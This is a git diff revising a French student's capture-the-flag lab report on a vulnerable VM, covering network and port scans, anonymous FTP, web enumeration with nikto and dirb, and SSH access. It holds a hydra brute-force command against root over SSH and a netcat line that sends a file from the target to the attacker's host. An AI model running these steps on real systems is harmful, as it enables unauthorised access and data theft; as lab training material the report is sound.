@@ -2,34 +2,34 @@
 
 #### _(Si les addresses ip peuvent varier dans les commandes et les captures d'écran entre 10.0.2.15 et 10.0.2.5, c'est parce que j'ai réalisé le tp sur 2 jours différents et en redémarrant la vm, l'ip n'était plus la même)_
 
-Pour scanner toutes les machines sur le réseau
+On commence par scanner toutes les machines présentes sur le réseau.
 `sudo netdiscover -r 10.0.2.0/24`
 
 ![1731071846729](image/rapport/1731071846729.png)
 
-Ca nous ermet de trouver l'ip de la machine cible : 10.0.2.15
+Cela nous permet de trouver l'ip de la machine cible : 10.0.2.15
 
-on test la connection entre les 2 machines
+On test la connexion entre les 2 machines
 `ping 10.0.2.15`
 
 ![1731070918309](image/rapport/1731070918309.png)
 
-on commence par chercher tous les ports ouverts
+Tout fonctionne correctement, on peut donc commencer à analyser les ports ouverts sur la machine cible.
 `nmap -p- 10.0.2.15`
 
 ![1731070574383](image/rapport/1731070574383.png)
 
 ## Port 21
 
-On peut analyser plus en détail le port 21. L'option "-sC" lance les scripts par défaut qui permettent de trouver des informations supplémentaires. L'option "-sV" permet de détecter les versions de chaque service utilisé. Enfin "-A" permet defaire un scan agresif pour détecter un maximum d'informations (OS et architectures...)
+On peut analyser plus en détail le port 21. L'option "-sC" lance les scripts par défaut qui permettent de trouver des informations supplémentaires. L'option "-sV" permet de détecter les versions de chaque service utilisé. Enfin "-A" permet de faire un scan agresif pour détecter un maximum d'informations (OS et architectures...)
 
 `nmap -sC -sV -A -p 21 10.0.2.15`
 
 ![1731075008382](image/rapport/1731075008382.png)
 
-on voit ici qu'il y a un FLAG.txt
+On voit directement qu'il y a un FLAG.txt ici.
 
-on peut se connecter en ftp (avec l'identifiant et le mdp 'ftp')
+On peut se connecter en ftp (avec l'identifiant et le mdp 'ftp' ou 'anonyme') car le serveur autorise les connexion en mode anonyme
 `ftp 10.0.2.15`
 et en faisant "ls" on retrouve bien notre FLAG.
 
@@ -47,12 +47,12 @@ puis sur la machine hote, on peut lire le fichier, on a trouvé un **FLAG_1** :
 
 ## Port 22
 
-On peut analyser plus en détail le port 22
+On peut maintenant analyser plus en détail le port 22
 `nmap -sC -sV -A -p 22 10.0.2.15`
 
 ![1731075194425](image/rapport/1731075194425.png)
 
-On voit qu'il y a du ssh, donc on va faire une attaque brut force en utilisant hydra
+On voit qu'il y a du ssh, donc on va faire une attaque brut force en utilisant hydra.
 `sudo hydra -l root -p /usr/share/wordlists/metasploit/unix-users.txt -t 6 ssh://10.0.2.15`
 
 ![1731075451542](image/rapport/1731075451542.png)
@@ -73,17 +73,17 @@ On tombe sur une page web avec rien de spécial dessus.
 
 En inspectant le code source de la page je ne vois rien non plus.
 
-On utilise donc l'outil nikto (port 80 par défaut donc pas besoin d'options)
+On utilise donc l'outil nikto qui permet de scanner le serveur web afin de détecter des vulnérabilités courantes ainsi que d'éventuels dossier ou fichiers cachés (port 80 par défaut donc pas besoin d'options)
 `nikto -h 10.0.2.15`
 
 ![1731075895889](image/rapport/1731075895889.png)
 
-Avec dirb on peut voir les sous dossiers cachés (port 80 par défaut donc pas besoin d'options)
+De même on peut utiliser dirb qui permet de trouver des dossiers et fichiers cachés à l'aide d'une liste de mots (wordlist) (port 80 par défaut donc pas besoin d'options)
 `dirb http://10.0.2.15 /usr/share/wordlists/dirb/common.txt`
 
 ![1731076851337](image/rapport/1731076851337.png)
 
-On voit qu'il y a un dossier `/passwords`
+Avec les 2 outils, on retrouve le mêmes dossier `/passwords`
 Je me rend dans le navigateurs et j'essaie d'accéder à `http://10.0.2.15/passwords` et je trouve un **FLAG_2**
 
 ![1731076257587](image/rapport/1731076257587.png)
@@ -94,7 +94,7 @@ A la meme racine il y a aussi un fichier passwords.html donc je m'y rend `http:/
 
 ![1731077959191](image/rapport/1731077959191.png)
 
-En inspectant la page, on trouve un mot de passe qui pourrait servir pour la suite : "winter"
+En inspectant la page, on trouve un mot de passe qui pourrait servir pour la suite : "winter".
 
 En effectuant la commande `dirb http://10.0.2.15 /usr/share/wordlists/dirb/common.txt`
 
@@ -127,9 +127,9 @@ L'interface nous affiche un chat retourné. Avec un peu de réflexion on compren
 
 ![1731598950870](image/rapport-tp1/1731598950870.png)
 
-L'interface affiche e nombreuses information, et on remarque le mot clé "Summer" sur la 2e ligne, contraire de "winter" que l'on a repéré avant, ainsi que "Morty" et "RickSanchez", qui font référence à la page web de l'adresse `10.0.2.15`.
+L'interface affiche de nombreuses information, et on remarque le mot clé "Summer" sur la 2e ligne, contraire de "winter" que l'on a repéré avant, ainsi que "Morty" et "RickSanchez", qui font référence à la page web de l'adresse `10.0.2.15`.
 
-On peut se connecter à l'utilisateur Summer en ssh, et avec le mot de passe "winter".
+On peut essayer de se connecter à l'utilisateur Summer en ssh, et avec le mot de passe "winter".
 `ssh Summer@10.0.2.5 -p 22222`
 
 ![1731599330907](image/rapport-tp1/1731599330907.png)
@@ -143,11 +143,11 @@ On peut utiliser la commande find pour avoir une idée de l'arboressance des fic
 
 ![1731602059562](image/rapport-tp1/1731602059562.png)
 
-On trouve un fichier NotAFlage.txt suspect. En l'ouvrant on s'aperçoit que ce n'est vraiment pas un Flag.
+On trouve un fichier NotAFlage.txt suspect. En l'ouvrant on s'aperçoit que c'est vraiment "pas un Flag".
 
-On peut aussi voir un fichier image nommé "Safe_Password.jpg". Comme on est connecté en ssh il est compliqué de réaliser des interractions dessus. En cherchant un peu j'ai vu qu'il était possible d'ouvrir une connexion entre la machine hote et la cible avec netcat afin de rapatrier le fichier sur la machine hote.
+On peut aussi voir un fichier image nommé "Safe_Password.jpg". Comme on est connecté en ssh il est compliqué de visualier directement l'image. En cherchant un peu j'ai vu qu'il était possible d'ouvrir une connexion entre la machine hote et la cible avec netcat afin de rapatrier le fichier sur la machine hote, ce qui permettrait de facillement le visualiser.
 
-En tapant la commande suivante sur ma machine hote, j'ouvre un connexion réseau et je dis que je vais appeller le fichier que je vais recevoir "fileMDP.jpg" : `nc -l -p 12345 > fileMDP.jpg`
+En tapant la commande suivante sur ma machine hote, j'ouvre un connexion réseau qui attend de recevoir un fichier que je vais nommer "fileMDP.jpg" : `nc -l -p 12345 > fileMDP.jpg`
 
 Depuis ma machine cible, j'envoie le fichier sur l'hote sur le port 12345 `cat Morty/Safe_Password.jpg | nc 10.0.2.4 12345`
 
@@ -162,7 +162,7 @@ On utilise la commande `strings fileMDP.jpg` pour déchiffrer toutes les chaines
 Sur la machine cible en ssh, je peux unzip l'archive /home/Morty/journal.txt.zip à l'aide du mot de passe que j'ai obtenu.
 J'ai une erreur "permission denied" car je n'ai pas les droits d'unzip l'archive ici. Je vais donc la copier dans le répertoire tmp.
 `cp /Morty/journal.txt.zip /tmp/`
-puis dans /tmp je l'unzip
+puis dans /tmp je peux l'unzip
 `unzip journal.txt.zip`
 
 en lisant le fichier je trouve un **FLAG_4**
@@ -175,13 +175,13 @@ en lisant le fichier je trouve un **FLAG_4**
 
 ![1731076487206](image/rapport/1731076487206.png)
 
-On voit que c'est encore un serveur web, donc on va utiliser à nouveau nikto et dirb
-
-Je ne trouve rien de spécial avec les commandes. Il s'agit d'un serveur web donc j'essaie de simplement tapper l'url `http://10.0.2.15:9090`
+Il s'agit d'un serveur web donc j'essaie de simplement tapper l'url `http://10.0.2.15:9090`
 
 ![1731078655553](image/rapport/1731078655553.png)
 
 On tombe sur une page web contenant un **FLAG_5**
+
+J'essaye également de faire un scan avec nikto et dirb mais je ne trouve rien de spécial avec ces commandes. 
 
 ## Port 13337
 
@@ -202,7 +202,7 @@ On a trouvé un **FLAG_6**
 
 ![1731079545295](image/rapport/1731079545295.png)
 
-On constate que c'est du ssh donc on va faire une attaque brut force en utilisant hydra
+On constate qu'il y a du ssh donc on peut essayer de faire une attaque brut force en utilisant hydra
 
 `sudo hydra -l root -p /usr/share/wordlists/metasploit/unix-users.txt -t 6 ssh://10.0.2.15`
 
